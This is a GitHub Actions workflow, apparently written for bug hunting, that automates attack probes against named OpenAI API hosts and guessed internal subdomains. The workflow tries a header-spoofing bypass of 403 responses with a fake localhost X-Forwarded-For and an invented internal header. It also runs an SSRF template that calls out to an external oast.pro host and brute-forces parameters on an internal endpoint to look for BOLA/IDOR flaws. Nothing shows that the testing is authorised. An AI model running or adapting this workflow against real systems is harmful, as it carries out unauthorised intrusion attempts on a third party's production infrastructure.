name: OpenAI-Safe-PoC-Generator
on:
  workflow_dispatch:

jobs:
  exploit-hunt:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Advanced Arsenal
        run: |
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          pip install arjun
          sudo mv ~/go/bin/* /usr/local/bin/

      - name: Phase 1:Header Smuggling PoC (The "Forbidden" Bypass)
        run: |
          # We test if 'X-Forwarded-For' turns the 403 into something else.
          # If the response length changes, we have a PoC for a Gateway Bypass.
          cat <<EOF > targets.txt
          https://api.openai.com/v1/completionsinternal
          https://admin.unified-8.api.openai.com
          https://higherlevelapi.unified-8.api.openai.com
          EOF
          
          httpx -l targets.txt \
            -H "X-Forwarded-For: 127.0.0.1" \
            -H "X-OpenAI-Internal: true" \
            -sc -cl -title -o bypass_poc.txt

      - name: Phase 2:SSRF PoC (Out-of-Band Testing)
        run: |
          # We use Nuclei's built-in 'Interactsh' to generate a safe PoC.
          # If the server is vulnerable to SSRF, it will ping an external 'oast.pro' URL.
          # This is the "Gold Standard" PoC: it proves access without touching internal data.
          nuclei -l targets.txt -t http/vulnerabilities/generic/ssrf-oast.yaml -o ssrf_poc.txt || true

      - name: Phase 3:BOLA/IDOR Parameter PoC
        run: |
          # We use Arjun to find the exact JSON parameters needed for a BOLA report.
          # Finding 'organization_id' on an internal path is a high-value PoC.
          arjun -u "https://api.openai.com/v1/completionsinternal" \
            -m POST -H "Content-Type: application/json" \
            -H "X-OpenAI-Internal: true" \
            --rate-limit 2 -oJ "bola_poc_params.json" || true

      - name: Archive Critical Evidence (Your Report Data)
        uses: actions/upload-artifact@v4
        with:
          name: openai-safe-poc-results
          path: |
            bypass_poc.txt
            ssrf_poc.txt
            bola_poc_params.json
            
